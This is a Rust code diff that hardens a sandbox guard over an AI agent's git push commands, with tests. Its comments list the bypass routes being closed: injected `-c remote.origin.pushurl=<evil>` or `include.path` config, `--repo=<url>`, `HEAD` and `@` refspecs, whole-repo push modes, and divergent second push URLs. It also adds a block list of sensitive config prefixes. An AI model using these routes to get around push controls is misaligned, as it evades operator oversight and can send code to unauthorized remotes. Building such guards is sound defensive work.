@@ -2121,6 +2121,70 @@ fn push_is_force(push_args: &[&str]) -> bool {
         .any(|a| a.starts_with('+'))
 }
 
+/// Config key prefixes that can redirect where a push lands (`remote.*`, `url.*`,
+/// `push.*`, `branch.*`) or redefine what a subcommand runs (`alias.*`). Supplied
+/// via `-c`/`--config-env` they diverge the exec'd push from the config the guard
+/// authorized against, so they are refused at the gate.
+///
+/// `include.*`/`includeif.*` are here too: `-c include.path=<file>` pulls in an
+/// arbitrary config file that can itself set `remote.origin.pushurl` (verified —
+/// `get-url --push` then reports the diverted URL while the guard's probe, run
+/// without the `-c`, still sees the real one). Blocking the include key closes
+/// the indirection without having to chase what the included file might set.
+const SENSITIVE_CONFIG_PREFIXES: &[&str] = &[
+    "alias.",
+    "remote.",
+    "url.",
+    "push.",
+    "branch.",
+    "include.",
+    "includeif.",
+];
+
+/// The first `-c` / `--config-env` key an agent supplied that matches a
+/// [`SENSITIVE_CONFIG_PREFIXES`] entry, if any.
+///
+/// Scans both the space-separated form (`-c k=v`, `--config-env k=ENV`) and the
+/// `=`-attached long form (`--config-env=k=ENV`). `-c` has no `=`-attached form:
+/// git always takes its `name=value` as the following token.
+fn injected_sensitive_config_key(args: &[&str]) -> Option<String> {
+    let sensitive = |kv: &str| -> Option<String> {
+        let key = kv.split('=').next().unwrap_or(kv);
+        let lower = key.to_ascii_lowercase();
+        SENSITIVE_CONFIG_PREFIXES
+            .iter()
+            .any(|p| lower.starts_with(p))
+            .then(|| key.to_string())
+    };
+    let mut i = 0;
+    while i < args.len() {
+        let arg = args[i];
+        if arg == "-c" || arg == "--config-env" {
+            if let Some(kv) = args.get(i + 1) {
+                if let Some(key) = sensitive(kv) {
+                    return Some(key);
+                }
+                i += 2;
+                continue;
+            }
+        } else if let Some(kv) = arg.strip_prefix("--config-env=")
+            && let Some(key) = sensitive(kv)
+        {
+            return Some(key);
+        }
+        i += 1;
+    }
+    None
+}
+
+/// Whether push args carry a `--repo`/`--repo=<url>` destination override, which
+/// redirects the push past remote-based authorization.
+fn push_has_repo_override(sub_args: &[&str]) -> bool {
+    sub_args
+        .iter()
+        .any(|a| *a == "--repo" || a.starts_with("--repo="))
+}
+
 /// Resolve the destination branch a refspec targets.
 ///
 /// Strips a leading `+` (force marker) and, for `src:dst` refspecs, returns the
@@ -2304,27 +2368,26 @@ pub fn gate_git(
         break;
     }
 
-    // Defense in depth: block `-c alias.*` arguments that could redefine subcommands.
-    // Even though unknown subcommands are now denied, this prevents confusion if an
-    // alias maps to an allowed subcommand name but actually runs something else.
-    if prevent_push {
-        let mut j = 0;
-        while j < args.len() {
-            if args[j] == "-c" {
-                if let Some(val) = args.get(j + 1) {
-                    let lower = val.to_lowercase();
-                    if lower.starts_with("alias.") {
-                        return Err("⚠️ BLOCKED by sandbox: 'git -c alias.*' is not allowed.\n\
-                             Push prevention is active — git alias definitions via -c are blocked \
-                             to prevent guard bypass."
-                            .to_string());
-                    }
-                }
-                j += 2;
-            } else {
-                j += 1;
-            }
-        }
+    // Defense in depth: block command-line config (`-c` / `--config-env`) that
+    // could redirect where a push lands or redefine what a subcommand does.
+    //
+    // The guard resolves the push destination with its OWN git calls, which
+    // forward only `-C`/`--git-dir`/`--work-tree` (never the agent's `-c`), but
+    // `perform_gate_effect` execs the ORIGINAL argv. So `-c
+    // remote.origin.pushurl=<evil>`, `-c remote.pushDefault=…`, `-c push.default=…`,
+    // `-c url.<b>.pushInsteadOf=…`, or an `alias.*` redefinition would be
+    // authorized against one config and then run under another (H-10). Rather
+    // than mirror every such key into the probe, reject the whole class at the
+    // gate — it is never needed for a legitimate push and always precedes one.
+    if prevent_push && let Some(key) = injected_sensitive_config_key(args) {
+        return Err(format!(
+            "⚠️ BLOCKED by sandbox: 'git -c {key}=…' is not allowed while push prevention is active.\n\
+             Command-line config that can redirect a push (remote.*, url.*, push.*, branch.*) or\n\
+             redefine a subcommand (alias.*) is refused, because the guard would authorize against\n\
+             different configuration than the push actually runs under.\n\
+             Configure the remote in the repository instead, and push to it by name.\n\
+             Please make a note of this for the human operator and continue with your remaining work."
+        ));
     }
 
     let Some(sub) = subcommand else {
@@ -2367,6 +2430,20 @@ pub fn gate_git(
         );
     }
 
+    // `git push --repo=<url>` overrides the destination entirely, so any
+    // remote/URL authorization the guard performs would be about a different
+    // target than the push writes to. Reject it while push prevention is active
+    // (H-10) — a legitimate push names a configured remote instead.
+    if prevent_push && sub == "push" && push_has_repo_override(&args[i + 1..]) {
+        return Err(
+            "⚠️ BLOCKED by sandbox: 'git push --repo=<url>' is not allowed while push prevention is active.\n\
+             It redirects the push to an arbitrary URL, bypassing remote-based authorization.\n\
+             Push to a configured remote by name instead.\n\
+             Please make a note of this for the human operator and continue with your remaining work."
+                .to_string(),
+        );
+    }
+
     if prevent_push && GIT_BLOCKED_SUBCOMMANDS.contains(&sub) {
         // When protect_default_branch_only is set, only block pushes targeting
         // the default branch (main/master). Feature branch pushes are allowed,
@@ -2399,25 +2476,17 @@ pub fn gate_git(
 
         if protect_default_branch_only && sub == "push" {
             let push_args = &args[i + 1..];
-            let target_branch = extract_push_target_branch(push_args, default_branch.as_deref());
             // Without a resolved default branch nothing is a proven feature
-            // branch: the relaxation this setting grants cannot be applied, so
-            // the push falls through to the normal block.
-            let is_feature_branch = if default_branch.is_none() {
-                false
-            } else if let Some(branch) = target_branch {
-                !is_protected_branch(branch, default_branch.as_deref())
-            } else {
-                // No explicit branch: `git push` pushes current branch.
-                // Resolve via real git to determine if we're on a protected branch.
-                let current_branch =
-                    real_git.and_then(|git| resolve_current_branch(git, &repo_args));
-                match current_branch {
-                    Some(ref b) if !is_protected_branch(b, default_branch.as_deref()) => true,
-                    Some(_) => false, // On default branch — fall through to block
-                    None => false,    // Can't determine branch — fail closed for safety
-                }
-            };
+            // branch, and a push whose destination refs cannot be enumerated
+            // (whole-repo modes, config-driven destinations) is never provably
+            // feature-only — both fall through to the normal block (fail closed).
+            let is_feature_branch = default_branch.is_some()
+                && match push_target_branches(push_args, real_git, &repo_args) {
+                    PushTargets::Branches(branches) if !branches.is_empty() => branches
+                        .iter()
+                        .all(|b| !is_protected_branch(b, default_branch.as_deref())),
+                    _ => false,
+                };
 
             if is_feature_branch {
                 // Feature branch push allowed, but still enforce force-push prevention
@@ -2440,25 +2509,44 @@ pub fn gate_git(
         if sub == "push" && !allow_push_rules.is_empty() {
             let push_args = &args[i + 1..];
             let has_force = push_is_force(push_args);
-            let (remote, branch) = extract_push_remote_and_branch(
-                push_args,
-                real_git,
-                &repo_args,
-                default_branch.as_deref(),
-            );
-            // Resolve the destination remote's URL in the repository this
-            // command targets. A bare `git push` with no remote uses the
-            // branch's configured remote, which is `origin` in all but exotic
-            // setups; guessing wrong here only fails closed.
-            let remote_url = real_git.and_then(|git| {
-                resolve_remote_url(git, &repo_args, remote.as_deref().unwrap_or(SCOPE_REMOTE))
-            });
-            if matches_allow_push_rule(
-                allow_push_rules,
-                remote_url.as_deref(),
-                branch.as_deref(),
-                has_force,
-            ) {
+            // Resolve where the push actually lands, then authorize against
+            // EVERY push URL of that destination. A bare `git push` follows
+            // git's own remote resolution (`branch.<b>.pushRemote` →
+            // `remote.pushDefault` → `branch.<b>.remote` → `origin`) rather than
+            // assuming `origin`, and a remote-named rule must match every
+            // configured `pushurl` — `git push` writes to all of them, so
+            // checking only the first fails open (H-10). `matches_allow_push_rule`
+            // treats an empty URL set as authorizing nothing for a remote-named
+            // rule (fail closed).
+            let remote_positional = push_positionals(push_args)
+                .first()
+                .copied()
+                .filter(|r| !r.contains(':') && !r.starts_with('+'));
+            let dest_remote = match remote_positional {
+                Some(r) => r.to_string(),
+                None => real_git.map_or_else(
+                    || SCOPE_REMOTE.to_string(),
+                    |git| resolve_push_dest_remote(git, &repo_args),
+                ),
+            };
+            let dest_url_strings = real_git
+                .map(|git| resolve_push_urls(git, &repo_args, &dest_remote))
+                .unwrap_or_default();
+            let dest_urls: Vec<&str> = dest_url_strings.iter().map(String::as_str).collect();
+            // The rule's branch glob must bind against EVERY destination branch
+            // the push updates. An unconstrainable form (whole-repo modes,
+            // multi-refspec beyond the glob, config-driven destinations) is
+            // never authorized — the operator's `branches` filter cannot bound
+            // it, so it fails closed (H-10).
+            let authorized = match push_target_branches(push_args, real_git, &repo_args) {
+                PushTargets::Branches(branches) if !branches.is_empty() => {
+                    branches.iter().all(|b| {
+                        matches_allow_push_rule(allow_push_rules, &dest_urls, Some(b), has_force)
+                    })
+                }
+                _ => false,
+            };
+            if authorized {
                 return Ok(());
             }
             // A rule naming a remote that could not be pinned to a URL at
@@ -2572,46 +2660,127 @@ fn is_protected_branch(branch: &str, default_branch: Option<&str>) -> bool {
         || default_branch == Some(short)
 }
 
-/// Extract the target branch from `git push` arguments.
-///
-/// Parses refspecs like `origin feature-branch`, `origin HEAD:refs/heads/feature`,
-/// `origin +main` (force), or just `feature-branch`. Returns None if no explicit
-/// branch target found (e.g. `git push origin`, where the current branch is pushed).
-fn extract_push_target_branch<'a>(
-    push_args: &[&'a str],
-    default_branch: Option<&str>,
-) -> Option<&'a str> {
-    let positionals = push_positionals(push_args);
+/// `git push` flags that update refs a branch glob cannot bound: whole-repo and
+/// all-refs push modes. Verified against git 2.50 — `--all`/`--branches` push
+/// every branch (incl. the default), `--mirror` every ref, `--tags` all tags,
+/// `--follow-tags` pushes annotated tags reachable from the branch *in addition*
+/// to it (verified: `push origin agent/x --follow-tags` pushes agent/x AND the
+/// tag), `--prune` deletes remote refs. A branch-constrained rule must fail
+/// closed on any of them (H-10).
+fn is_unconstrainable_push_flag(arg: &str) -> bool {
+    matches!(
+        arg,
+        "--all" | "--mirror" | "--branches" | "--tags" | "--follow-tags" | "--prune"
+    )
+}
 
-    // `git push [remote] [refspec...]`
-    // positionals[0] is usually the remote, positionals[1+] are refspecs
-    match positionals.len() {
-        0 => None, // `git push` — pushes current branch
+/// What a `git push` writes to, as far as a branch filter can be enforced.
+enum PushTargets {
+    /// The push updates refs that cannot be enumerated against a branch glob
+    /// (whole-repo push modes, `matching`/`upstream` push.default, a configured
+    /// `remote.<dest>.push` refspec, or an undeterminable current branch). Any
+    /// branch-constrained decision must fail closed.
+    Unconstrainable,
+    /// The exact set of destination branch names the push updates. Every one
+    /// must satisfy the branch constraint for the push to be authorized.
+    Branches(Vec<String>),
+}
+
+/// Enumerate the destination branches a `git push` updates, or declare it
+/// unconstrainable against a branch filter (fail closed).
+///
+/// This is the single choke point both the `protect_default_branch_only` and
+/// `allow_push` branch checks route through, so every push *form* — modes,
+/// multi-refspec, and the config-driven no-refspec destinations — is judged the
+/// same way. Checking only `positionals[1]` (the old behaviour) let
+/// `git push origin agent/x main`, `--all`, `push.default=matching`, and a
+/// `remote.push` refspec write outside the glob (H-10, all verified by dry-run).
+fn push_target_branches(
+    push_args: &[&str],
+    real_git: Option<&Path>,
+    repo_args: &[&str],
+) -> PushTargets {
+    if push_args.iter().any(|a| is_unconstrainable_push_flag(a)) {
+        return PushTargets::Unconstrainable;
+    }
+
+    let positionals = push_positionals(push_args);
+    // Mirror extract_push_target_branch's positional interpretation, but keep
+    // the explicit remote (if any) and ALL refspecs.
+    let (remote_positional, refspecs): (Option<&str>, &[&str]) = match positionals.len() {
+        0 => (None, &[]),
         1 => {
-            // Could be remote OR refspec. A colon (`HEAD:refs/heads/branch`) or a
-            // leading `+` (forced refspec) means an explicit target; a bare word
-            // is just a remote name with no branch specified.
             let arg = positionals[0];
             if arg.contains(':') || arg.starts_with('+') {
-                Some(refspec_target_branch(arg))
+                (None, &positionals[0..1]) // a lone refspec; remote defaulted
             } else {
-                None
+                (Some(arg), &[]) // a bare remote; no refspec
             }
         }
-        _ => {
-            // positionals[0] = remote, positionals[1+] = refspecs
-            // Check ALL refspecs — return first that is a default branch (most restrictive).
-            // This prevents bypass via `git push origin feature main` where "main" is the
-            // second refspec and would be missed if we only check the first.
-            for refspec in &positionals[1..] {
-                let branch = refspec_target_branch(refspec);
-                if is_protected_branch(branch, default_branch) {
-                    return Some(branch);
+        _ => (Some(positionals[0]), &positionals[1..]),
+    };
+
+    if !refspecs.is_empty() {
+        // Explicit refspecs override push.default and any configured push
+        // refspec, so the destinations are exactly their target refs — but only
+        // once the *shape* of each refspec is accounted for. Comparing a token
+        // literally is what let `HEAD`, `@`, `:` and glob refspecs past: the
+        // guard matched the token text against the glob while git resolved it
+        // to a real branch (H-10).
+        let mut branches = Vec::new();
+        for spec in refspecs {
+            let bare = spec.strip_prefix('+').unwrap_or(spec);
+            if bare.contains(':') {
+                // Explicit destination: a remote-side ref NAME, taken literally.
+                let dst = refspec_target_branch(bare);
+                // `:` and `src:` push the matching set; a `*` destination is a
+                // multi-ref pattern. Neither can be enumerated against a glob.
+                if dst.is_empty() || dst.contains('*') {
+                    return PushTargets::Unconstrainable;
+                }
+                branches.push(dst.to_string());
+            } else {
+                if bare.is_empty() || bare.contains('*') {
+                    return PushTargets::Unconstrainable;
+                }
+                // A colon-less token is a LOCAL rev whose resolved branch is the
+                // destination: `HEAD` and `@` mean the current branch, not a
+                // branch literally named "HEAD". Resolve it; anything that is
+                // not a `refs/heads/` ref (tag, detached HEAD, unknown token)
+                // is not a branch this glob can authorize, so fail closed.
+                let Some(git) = real_git else {
+                    return PushTargets::Unconstrainable;
+                };
+                match resolve_token_branch(git, repo_args, bare) {
+                    Some(b) => branches.push(b),
+                    None => return PushTargets::Unconstrainable,
                 }
             }
-            // No default branch found — return first refspec for caller context.
-            Some(refspec_target_branch(positionals[1]))
         }
+        return PushTargets::Branches(branches);
+    }
+
+    // No explicit refspec: the destination is normally the current branch, but
+    // `push.default` in {matching,upstream,tracking} or a configured
+    // `remote.<dest>.push` refspec sends it to refs we cannot enumerate here.
+    let Some(git) = real_git else {
+        return PushTargets::Unconstrainable; // cannot probe config → fail closed
+    };
+    if let Some(mode) = git_config_value(git, repo_args, "push.default")
+        && matches!(mode.as_str(), "matching" | "upstream" | "tracking")
+    {
+        return PushTargets::Unconstrainable;
+    }
+    let dest_remote = match remote_positional {
+        Some(r) => r.to_string(),
+        None => resolve_push_dest_remote(git, repo_args),
+    };
+    if git_config_value(git, repo_args, &format!("remote.{dest_remote}.push")).is_some() {
+        return PushTargets::Unconstrainable;
+    }
+    match resolve_current_branch(git, repo_args) {
+        Some(b) => PushTargets::Branches(vec![b]),
+        None => PushTargets::Unconstrainable, // undeterminable branch → fail closed
     }
 }
 
@@ -2670,6 +2839,39 @@ fn repo_target_args<'a>(args: &[&'a str]) -> Vec<&'a str> {
     out
 }
 
+/// The branch a colon-less push token designates, in the repo `repo_args` targets.
+///
+/// `git push origin HEAD` does not push to a branch named "HEAD" — it pushes to
+/// whatever branch HEAD resolves to. Comparing the token text against a branch
+/// glob is what let `HEAD` and `@` past the guard while the real push advanced
+/// the protected branch (H-10). `rev-parse --symbolic-full-name` gives the ref
+/// the token names, verified against git 2.50:
+///
+/// - `HEAD` / `@` on a branch → `refs/heads/<branch>`
+/// - a branch name → its own `refs/heads/` ref
+/// - a tag → `refs/tags/<name>` (not a branch)
+/// - detached HEAD → the literal `HEAD` (exit 0, no ref)
+/// - an unknown token → exit 128
+///
+/// Only a `refs/heads/` answer is a branch, so everything else yields `None`
+/// and the caller fails closed. The token is always a push positional, which
+/// `push_positionals` never lets start with `-`, so it cannot be read as a flag.
+#[allow(clippy::disallowed_methods)] // `real_git` is a git::trusted_git() path supplied by the caller
+fn resolve_token_branch(real_git: &Path, repo_args: &[&str], token: &str) -> Option<String> {
+    let output = std::process::Command::new(real_git)
+        .args(repo_args)
+        .args(["rev-parse", "--symbolic-full-name", token])
+        .output()
+        .ok()?;
+    if !output.status.success() {
+        return None;
+    }
+    let full = String::from_utf8_lossy(&output.stdout).trim().to_string();
+    full.strip_prefix("refs/heads/")
+        .filter(|b| !b.is_empty())
+        .map(ToString::to_string)
+}
+
 /// Resolve the current git branch of the repository `repo_args` targets.
 #[allow(clippy::disallowed_methods)] // `real_git` is a git::trusted_git() path supplied by the caller
 fn resolve_current_branch(real_git: &Path, repo_args: &[&str]) -> Option<String> {
@@ -2690,7 +2892,14 @@ fn resolve_current_branch(real_git: &Path, repo_args: &[&str]) -> Option<String>
     }
 }
 
-/// Normalized URL of `remote` in the repository `repo_args` targets.
+/// Normalized *push* URL of `remote` in the repository `repo_args` targets.
+///
+/// `--push` reports the URL a `git push` to this remote actually writes to: the
+/// remote's `pushurl` when one is configured, otherwise its fetch URL. Both
+/// callers are push-authorization decisions, so the URL the push goes to — not
+/// the fetch URL it may diverge from — is the one identity must be proven
+/// against (H-10). A remote with a divergent `pushurl` was previously authorized
+/// against its fetch URL while pushing somewhere else entirely.
 ///
 /// `None` when the remote does not exist, git fails, or no git binary is
 /// available — every caller treats that as "cannot prove identity" and fails
@@ -2700,7 +2909,7 @@ fn resolve_remote_url(real_git: &Path, repo_args: &[&str], remote: &str) -> Opti
     // `--` guards against a remote name that looks like a flag.
     let output = std::process::Command::new(real_git)
         .args(repo_args)
-        .args(["remote", "get-url", "--", remote])
+        .args(["remote", "get-url", "--push", "--", remote])
         .output()
         .ok()?;
     if !output.status.success() {
@@ -2712,6 +2921,86 @@ fn resolve_remote_url(real_git: &Path, repo_args: &[&str], remote: &str) -> Opti
     } else {
         Some(crate::trust::normalize_remote_url(&url))
     }
+}
+
+/// Every normalized push URL of `remote` in the repository `repo_args` targets.
+///
+/// `git push` writes to ALL of a remote's configured `pushurl`s, but `get-url
+/// --push` without `--all` returns only the first — a divergent second URL would
+/// otherwise go unauthorized. The gate-time check requires *every* returned URL
+/// to match a rule, so this returns them all.
+///
+/// Empty when the remote does not exist, git fails, or no git binary is
+/// available — the caller treats an empty set as "cannot prove identity" and
+/// fails closed.
+#[allow(clippy::disallowed_methods)] // `real_git` is a git::trusted_git() path supplied by the caller
+fn resolve_push_urls(real_git: &Path, repo_args: &[&str], remote: &str) -> Vec<String> {
+    // `--` guards against a remote name that looks like a flag.
+    let Ok(output) = std::process::Command::new(real_git)
+        .args(repo_args)
+        .args(["remote", "get-url", "--push", "--all", "--", remote])
+        .output()
+    else {
+        return Vec::new();
+    };
+    if !output.status.success() {
+        return Vec::new();
+    }
+    String::from_utf8_lossy(&output.stdout)
+        .lines()
+        .map(str::trim)
+        .filter(|line| !line.is_empty())
+        .map(crate::trust::normalize_remote_url)
+        .collect()
+}
+
+/// A single git config value in the repository `repo_args` targets, or `None`.
+///
+/// `key` is a fixed, guard-constructed key (never agent-supplied), so no `--`
+/// guard is needed; `--get` takes exactly one name.
+#[allow(clippy::disallowed_methods)] // `real_git` is a git::trusted_git() path supplied by the caller
+fn git_config_value(real_git: &Path, repo_args: &[&str], key: &str) -> Option<String> {
+    let output = std::process::Command::new(real_git)
+        .args(repo_args)
+        .args(["config", "--get", key])
+        .output()
+        .ok()?;
+    if !output.status.success() {
+        return None;
+    }
+    let value = String::from_utf8_lossy(&output.stdout).trim().to_string();
+    if value.is_empty() { None } else { Some(value) }
+}
+
+/// The remote a bare `git push` (no explicit remote argument) writes to,
+/// following git's own resolution order (verified against git 2.50):
+/// `branch.<current>.pushRemote`, then `remote.pushDefault`, then
+/// `branch.<current>.remote`, then `origin`.
+///
+/// Resolved in the repository `repo_args` targets so the authorization decision
+/// is made about the URL the push truly lands at, rather than an assumed
+/// `origin` — assuming `origin` fails *open* whenever a diverted `pushRemote`,
+/// `pushDefault` or upstream `remote` is configured but `origin` happens to
+/// match the rule (H-10).
+fn resolve_push_dest_remote(real_git: &Path, repo_args: &[&str]) -> String {
+    let branch = resolve_current_branch(real_git, repo_args);
+    if let Some(b) = &branch
+        && let Some(remote) =
+            git_config_value(real_git, repo_args, &format!("branch.{b}.pushRemote"))
+    {
+        return remote;
+    }
+    if let Some(remote) = git_config_value(real_git, repo_args, "remote.pushDefault") {
+        return remote;
+    }
+    // git falls back to the branch's fetch remote before `origin`: a planted
+    // `branch.<b>.remote` diverts a bare push, so it must be resolved too.
+    if let Some(b) = &branch
+        && let Some(remote) = git_config_value(real_git, repo_args, &format!("branch.{b}.remote"))
+    {
+        return remote;
+    }
+    SCOPE_REMOTE.to_string()
 }
 
 /// The default branch of `remote` in the repository `repo_args` targets.
@@ -2790,31 +3079,11 @@ pub fn resolve_push_rule_urls(
         .collect()
 }
 
-/// Extract the remote and branch from `git push` arguments.
-/// Returns (remote, branch) — either may be None.
-fn extract_push_remote_and_branch(
-    push_args: &[&str],
-    real_git: Option<&Path>,
-    repo_args: &[&str],
-    default_branch: Option<&str>,
-) -> (Option<String>, Option<String>) {
-    let target = extract_push_target_branch(push_args, default_branch);
-    let branch = match target {
-        Some(b) => Some(b.to_string()),
-        None => real_git.and_then(|git| resolve_current_branch(git, repo_args)),
-    };
-
-    // Extract remote (first positional — the remote name).
-    let remote = push_positionals(push_args).first().map(ToString::to_string);
-
-    (remote, branch)
-}
-
 /// Check if a push matches any allow_push exception rule.
 /// All specified fields in a rule must match (AND logic).
 fn matches_allow_push_rule(
     rules: &[crate::config::ResolvedPushRule],
-    remote_url: Option<&str>,
+    dest_urls: &[&str],
     branch: Option<&str>,
     is_force: bool,
 ) -> bool {
@@ -2836,13 +3105,19 @@ fn matches_allow_push_rule(
         // authorization #215 exists to prevent, since every repository has a
         // remote called `origin`. The operator is warned at launch and told why
         // the push was blocked.
+        //
+        // A push writes to *every* configured `pushurl`, so a remote-named rule
+        // authorizes the push only if EVERY destination URL is the pinned one;
+        // an empty set (URL unresolvable) authorizes nothing. Checking only the
+        // first URL would let a divergent second `pushurl` through (H-10). A
+        // rule with no remote (`remote: None`) is branches-only by the
+        // operator's choice and skips the URL check entirely.
         if rule.remote.is_some() {
             let Some(rule_url) = rule.url.as_deref() else {
                 continue;
             };
-            match remote_url {
-                Some(u) if u == rule_url => {}
-                _ => continue,
+            if dest_urls.is_empty() || dest_urls.iter().any(|u| *u != rule_url) {
+                continue;
             }
         }
         // Check branch constraints (glob patterns)
@@ -3769,6 +4044,26 @@ mod tests {
         assert!(result.is_err());
     }
 
+    /// Create local branches in a scratch repo so a test can push to them.
+    ///
+    /// The guard resolves a colon-less push token with `rev-parse`, so a branch
+    /// that does not exist locally cannot be pushed — git refuses such a push
+    /// too ("src refspec does not match any"), so a fixture that skips this is
+    /// testing a push that could never happen.
+    fn make_branches(git: &Path, repo: &Path, names: &[&str]) {
+        for name in names {
+            let ok = std::process::Command::new(git)
+                .args(["-C", repo.to_str().unwrap(), "branch", name])
+                .env("GIT_CONFIG_GLOBAL", "/dev/null")
+                .env("GIT_CONFIG_NOSYSTEM", "1")
+                .output()
+                .expect("git must run")
+                .status
+                .success();
+            assert!(ok, "creating branch {name} must succeed");
+        }
+    }
+
     // ── protect_default_branch_only tests ──
 
     /// `gate_git` for a push inside `repo`, under `protect_default_branch_only`.
@@ -3784,6 +4079,7 @@ mod tests {
             return; // no git available
         };
         let git = which_git().unwrap();
+        make_branches(&git, &repo, &["feature/x", "copilot/fix", "dev"]);
         let dir = repo.to_string_lossy().into_owned();
         for branch in ["feature/x", "copilot/fix", "dev"] {
             assert!(
@@ -3885,6 +4181,7 @@ mod tests {
             return;
         };
         let git = which_git().unwrap();
+        make_branches(&git, &repo, &["release/2025", "feature/x"]);
         let dir = repo.to_string_lossy().into_owned();
         assert!(gate_push_in(&git, &dir, &["push", "origin", "release/2026"]).is_err());
         assert!(
@@ -3908,17 +4205,78 @@ mod tests {
     }
 
     #[test]
-    fn extract_push_target_handles_refspecs() {
+    fn push_target_branches_enumerates_and_fails_closed() {
+        // Pure-arg cases (no git): only forms that need no resolution enumerate.
+        let branches = |args: &[&str]| match push_target_branches(args, None, &[]) {
+            PushTargets::Branches(b) => Some(b),
+            PushTargets::Unconstrainable => None,
+        };
+        // An explicit destination is a literal remote-side ref name.
         assert_eq!(
-            extract_push_target_branch(&["origin", "feature"], None),
-            Some("feature")
+            branches(&["origin", "HEAD:refs/heads/main"]),
+            Some(vec!["main".to_string()])
         );
         assert_eq!(
-            extract_push_target_branch(&["origin", "HEAD:refs/heads/main"], None),
-            Some("main")
+            branches(&["origin", "agent/x:main", "b:release"]),
+            Some(vec!["main".to_string(), "release".to_string()])
         );
-        assert_eq!(extract_push_target_branch(&["origin"], None), None);
-        assert_eq!(extract_push_target_branch(&[], None), None);
+        // Glob and empty destinations are multi-ref/matching forms (H-10).
+        assert!(branches(&["origin", "refs/heads/*:refs/heads/*"]).is_none());
+        assert!(branches(&["origin", "refs/heads/ma*:refs/heads/ma*"]).is_none());
+        assert!(branches(&["origin", ":"]).is_none());
+        assert!(branches(&["origin", "main:"]).is_none());
+        assert!(branches(&["origin", "*"]).is_none());
+        // Whole-repo modes.
+        assert!(branches(&["--all", "origin"]).is_none());
+        assert!(branches(&["--mirror", "origin"]).is_none());
+        assert!(branches(&["--tags", "origin"]).is_none());
+        assert!(branches(&["--follow-tags", "origin"]).is_none());
+        // A colon-less token needs resolution; without git that fails closed.
+        assert!(branches(&["origin", "feature"]).is_none());
+        assert!(branches(&["origin", "HEAD"]).is_none());
+        assert!(branches(&["origin"]).is_none()); // bare remote, no git to probe
+        assert!(branches(&[]).is_none());
+    }
+
+    #[test]
+    fn push_target_branches_resolves_colonless_tokens() {
+        // `HEAD` and `@` are not branch names — they resolve to the current
+        // branch, which is what the push actually writes (H-10).
+        let Some(git) = git_or_skip() else { return };
+        let (_tmp, repo) = scratch_repo("agent/x", "https://github.com/o/o.git")
+            .expect("git present: scratch repo must build");
+        make_branches(&git, &repo, &["v-branch"]);
+        let dir = repo.to_string_lossy().into_owned();
+        let repo_args = ["-C", dir.as_str()];
+        let branches = |args: &[&str]| match push_target_branches(args, Some(&git), &repo_args) {
+            PushTargets::Branches(b) => Some(b),
+            PushTargets::Unconstrainable => None,
+        };
+        // On agent/x, HEAD and @ both mean agent/x.
+        assert_eq!(
+            branches(&["origin", "HEAD"]),
+            Some(vec!["agent/x".to_string()])
+        );
+        assert_eq!(
+            branches(&["origin", "@"]),
+            Some(vec!["agent/x".to_string()])
+        );
+        // A plain branch name still resolves to itself.
+        assert_eq!(
+            branches(&["origin", "main"]),
+            Some(vec!["main".to_string()])
+        );
+        assert_eq!(
+            branches(&["origin", "+main"]),
+            Some(vec!["main".to_string()])
+        );
+        // Every refspec is enumerated, not just the first.
+        assert_eq!(
+            branches(&["origin", "agent/x", "main"]),
+            Some(vec!["agent/x".to_string(), "main".to_string()])
+        );
+        // A token that is not a branch fails closed.
+        assert!(branches(&["origin", "no-such-branch"]).is_none());
     }
 
     #[test]
@@ -3948,35 +4306,43 @@ mod tests {
         // Matches: the push's remote resolves to the pinned URL + matching branch
         assert!(matches_allow_push_rule(
             &rules,
-            Some("github.com/me/fork"),
+            &["github.com/me/fork"],
             Some("agent/fix-123"),
             false
         ));
         // Doesn't match: same remote *name*, different repository
         assert!(!matches_allow_push_rule(
             &rules,
-            Some("github.com/someone/else"),
+            &["github.com/someone/else"],
             Some("agent/fix-123"),
             false
         ));
         // Doesn't match: the push's remote could not be resolved at all
         assert!(!matches_allow_push_rule(
             &rules,
-            None,
+            &[],
+            Some("agent/fix-123"),
+            false
+        ));
+        // Doesn't match: one of several push URLs diverges — a push writes to
+        // all of them, so every URL must be the pinned one (H-10).
+        assert!(!matches_allow_push_rule(
+            &rules,
+            &["github.com/me/fork", "github.com/evil/elsewhere"],
             Some("agent/fix-123"),
             false
         ));
         // Doesn't match: wrong branch
         assert!(!matches_allow_push_rule(
             &rules,
-            Some("github.com/me/fork"),
+            &["github.com/me/fork"],
             Some("main"),
             false
         ));
         // Doesn't match: force push not allowed
         assert!(!matches_allow_push_rule(
             &rules,
-            Some("github.com/me/fork"),
+            &["github.com/me/fork"],
             Some("agent/fix"),
             true
         ));
@@ -3991,18 +4357,19 @@ mod tests {
         }];
         assert!(!matches_allow_push_rule(
             &unpinned,
-            Some("github.com/me/fork"),
+            &["github.com/me/fork"],
             Some("agent/fix-123"),
             false
         ));
         assert!(!matches_allow_push_rule(
             &unpinned,
-            None,
+            &[],
             Some("agent/fix-123"),
             false
         ));
 
-        // Rule with no remote constraint: branches only, force allowed.
+        // Rule with no remote constraint: branches only, force allowed. The URL
+        // set is irrelevant — the operator chose not to pin a remote.
         let rules_force = vec![ResolvedPushRule {
             remote: None,
             branches: vec!["agent/*".to_string()],
@@ -4011,13 +4378,13 @@ mod tests {
         }];
         assert!(matches_allow_push_rule(
             &rules_force,
-            Some("github.com/any/repo"),
+            &["github.com/any/repo"],
             Some("agent/x"),
             true
         ));
         assert!(matches_allow_push_rule(
             &rules_force,
-            None,
+            &[],
             Some("agent/x"),
             false
         ));
@@ -4059,9 +4426,29 @@ mod tests {
                 .filter(|o| o.status.success())
         };
         run(&["init"])?;
-        // No commit needed: symbolic-ref and remotes work on an empty repo, and
         // `git init -b` is not available on every git these tests may meet.
         run(&["symbolic-ref", "HEAD", &format!("refs/heads/{branch}")])?;
+        // A real commit, so `branch` actually exists. The guard resolves a
+        // colon-less push token (`HEAD`, `@`, a branch name) with `rev-parse`,
+        // which answers nothing in an unborn repository — an unborn fixture
+        // would make every push fail closed for the wrong reason and hide
+        // whatever the test meant to prove.
+        run(&[
+            "-c",
+            "user.email=t@example.com",
+            "-c",
+            "user.name=t",
+            "commit",
+            "--allow-empty",
+            "-q",
+            "-m",
+            "init",
+        ])?;
+        // The remote's default branch exists locally too, so a push naming it
+        // resolves the way it would in a real clone.
+        if default_branch != branch {
+            run(&["branch", default_branch])?;
+        }
         run(&["remote", "add", "origin", origin_url])?;
         // `git clone` records the remote's default branch here; these fixtures
         // stand in for cloned repos, so they record one too.
@@ -4086,6 +4473,21 @@ mod tests {
             .ok()
             .filter(|o| o.status.success())
             .map(|_| PathBuf::from("git"))
+    }
+
